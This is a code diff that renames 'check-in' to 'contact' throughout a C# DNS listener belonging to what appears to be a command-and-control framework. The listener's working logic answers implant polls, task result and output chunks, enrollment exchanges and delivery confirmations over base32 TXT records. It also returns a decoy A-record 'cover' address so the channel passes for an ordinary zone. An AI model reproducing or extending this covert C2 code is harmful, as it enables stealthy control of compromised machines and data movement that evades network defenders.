@@ -2,15 +2,15 @@ using Microsoft.Extensions.Logging;
 
 namespace Rod.Transport.Listeners.Dns;
 
-// The DNS check-in answer core (architecture.md Sec 8), shared by the two
+// The DNS contact answer core (architecture.md Sec 8), shared by the two
 // carriages that speak the DNS grammar: the UDP listener's datagrams and
 // the DoH route's HTTP bodies (RFC 8484). The wire grammar lives in
-// DnsCheckInNames and the contract doc; the tasking/presence composition
+// DnsContactNames and the contract doc; the tasking/presence composition
 // lives in DnsBeaconBridge. The carriage changes; the answer never does.
 
 /// <summary>
 /// Answers one DNS wire query under a zone: a poll, result chunk, or
-/// enrollment exchange under the zone gets the check-in treatment; an A
+/// enrollment exchange under the zone gets the contact treatment; an A
 /// query under the zone resolves to the cover address (a zone that
 /// answered TXT for random labels but NXDOMAIN for every A query would
 /// read as a TXT-only oddity -- an ordinary v4 zone answers its A records,
@@ -19,7 +19,7 @@ namespace Rod.Transport.Listeners.Dns;
 /// what it is; a query for another zone entirely is REFUSED (rcode 5) --
 /// this listener is not an open resolver.
 /// </summary>
-internal sealed class DnsCheckInAnswerer
+internal sealed class DnsContactAnswerer
 {
     private readonly string _zone;
     private readonly DnsBeaconBridge _bridge;
@@ -33,7 +33,7 @@ internal sealed class DnsCheckInAnswerer
     // points nowhere while reading as an ordinary record.
     private readonly System.Net.IPAddress? _coverHost;
 
-    public DnsCheckInAnswerer(
+    public DnsContactAnswerer(
         Rod.Transport.Listeners.Listener listener, DnsBeaconBridge bridge, ILogger logger)
     {
         _zone = listener.PublicEndpoint.TrimEnd('.').ToLowerInvariant();
@@ -63,9 +63,9 @@ internal sealed class DnsCheckInAnswerer
             return EmptyResponse(parsed.Id, responseCode: 5); // REFUSED: not our zone
 
         // The cover: an A query anywhere in the zone resolves, the shape an
-        // ordinary v4 zone's answer section takes. Check-in names answer the
+        // ordinary v4 zone's answer section takes. Contact names answer the
         // cover too -- the TXT answer is the only channel that carries
-        // check-in data, and it answers below.
+        // contact data, and it answers below.
         if (question.Type == DnsCodec.AType)
         {
             var cover = new DnsMessage
@@ -92,7 +92,7 @@ internal sealed class DnsCheckInAnswerer
 
         try
         {
-            if (DnsCheckInNames.TryParseSealedPoll(name, _zone) is { } sealedPoll)
+            if (DnsContactNames.TryParseSealedPoll(name, _zone) is { } sealedPoll)
             {
                 // The sealed carriage's poll: the key id in the name resolves
                 // the answer's seal. The TXT payload is base32 like every
@@ -100,27 +100,27 @@ internal sealed class DnsCheckInAnswerer
                 // plaintext.
                 var sealedAnswer = await _bridge.PollAsync(sealedPoll.Implant, sealedPoll.KeyId, cancellationToken);
                 if (sealedAnswer is not null)
-                    response.Answers.Add(TxtAnswer(name, DnsCheckInNames.Encode(sealedAnswer)));
+                    response.Answers.Add(TxtAnswer(name, DnsContactNames.Encode(sealedAnswer)));
             }
-            else if (DnsCheckInNames.TryParsePoll(name, _zone) is { } poll)
+            else if (DnsContactNames.TryParsePoll(name, _zone) is { } poll)
             {
                 var marshaled = await _bridge.PollAsync(poll.Implant, cancellationToken);
                 if (marshaled is not null)
-                    response.Answers.Add(TxtAnswer(name, DnsCheckInNames.Encode(marshaled)));
+                    response.Answers.Add(TxtAnswer(name, DnsContactNames.Encode(marshaled)));
             }
-            else if (DnsCheckInNames.TryParseResult(name, _zone) is { } chunk)
+            else if (DnsContactNames.TryParseResult(name, _zone) is { } chunk)
             {
                 await _bridge.ResultChunkAsync(
                     chunk.Implant, chunk.Task, chunk.Outcome, chunk.Sequence, chunk.Terminal, chunk.Chunk,
                     cancellationToken);
             }
-            else if (DnsCheckInNames.TryParseChannel(name, _zone) is { } output)
+            else if (DnsContactNames.TryParseChannel(name, _zone) is { } output)
             {
                 await _bridge.ChannelChunkAsync(
                     output.Implant, output.Task, output.Sequence, output.Terminal, output.Chunk,
                     cancellationToken);
             }
-            else if (DnsCheckInNames.TryParseEnroll(name, _zone) is { } enroll)
+            else if (DnsContactNames.TryParseEnroll(name, _zone) is { } enroll)
             {
                 // The enrollment exchange (Sec 8): scoped by this listener's
                 // own engagement, the same rule every ingress follows. The
@@ -129,35 +129,35 @@ internal sealed class DnsCheckInAnswerer
                 var ack = await _bridge.EnrollChunkAsync(
                     _listener, enroll.Stream, enroll.Sequence, enroll.Terminal, enroll.Chunk, cancellationToken);
                 if (ack is not null)
-                    response.Answers.Add(TxtAnswer(name, DnsCheckInNames.Encode(ack)));
+                    response.Answers.Add(TxtAnswer(name, DnsContactNames.Encode(ack)));
                 else
                     response.ResponseCode = 3; // malformed shape: in-zone, unanswered
             }
-            else if (DnsCheckInNames.TryParseEnrollAnswer(name, _zone) is { } probe)
+            else if (DnsContactNames.TryParseEnrollAnswer(name, _zone) is { } probe)
             {
                 var part = await _bridge.EnrollAnswerAsync(probe.Token, probe.Sequence);
                 if (part is not null)
-                    response.Answers.Add(TxtAnswer(name, DnsCheckInNames.Encode(part)));
+                    response.Answers.Add(TxtAnswer(name, DnsContactNames.Encode(part)));
                 else
                     response.ResponseCode = 3; // unknown or expired token
             }
-            else if (DnsCheckInNames.TryParseDelivery(name, _zone) is { } delivery)
+            else if (DnsContactNames.TryParseDelivery(name, _zone) is { } delivery)
             {
                 // The retransmission half's confirmation: y once the exact
                 // blob landed, n while it has not -- the TXT payload rides
                 // base32 like every answer this grammar carries.
                 var landed = _bridge.DeliveryConfirmed(delivery.Task, delivery.Sha);
                 response.Answers.Add(TxtAnswer(
-                    name, DnsCheckInNames.Encode(new[] { (byte)(landed ? 'y' : 'n') })));
+                    name, DnsContactNames.Encode(new[] { (byte)(landed ? 'y' : 'n') })));
             }
             else
             {
-                response.ResponseCode = 3; // NXDOMAIN: in-zone but not a check-in
+                response.ResponseCode = 3; // NXDOMAIN: in-zone but not a contact
             }
         }
         catch (Exception ex)
         {
-            _logger.LogError(ex, "DNS listener {Name} failed a check-in for {Question}.", _listener.Name, question.Name);
+            _logger.LogError(ex, "DNS listener {Name} failed a contact for {Question}.", _listener.Name, question.Name);
             return EmptyResponse(parsed.Id, responseCode: 2); // SERVFAIL
         }
 
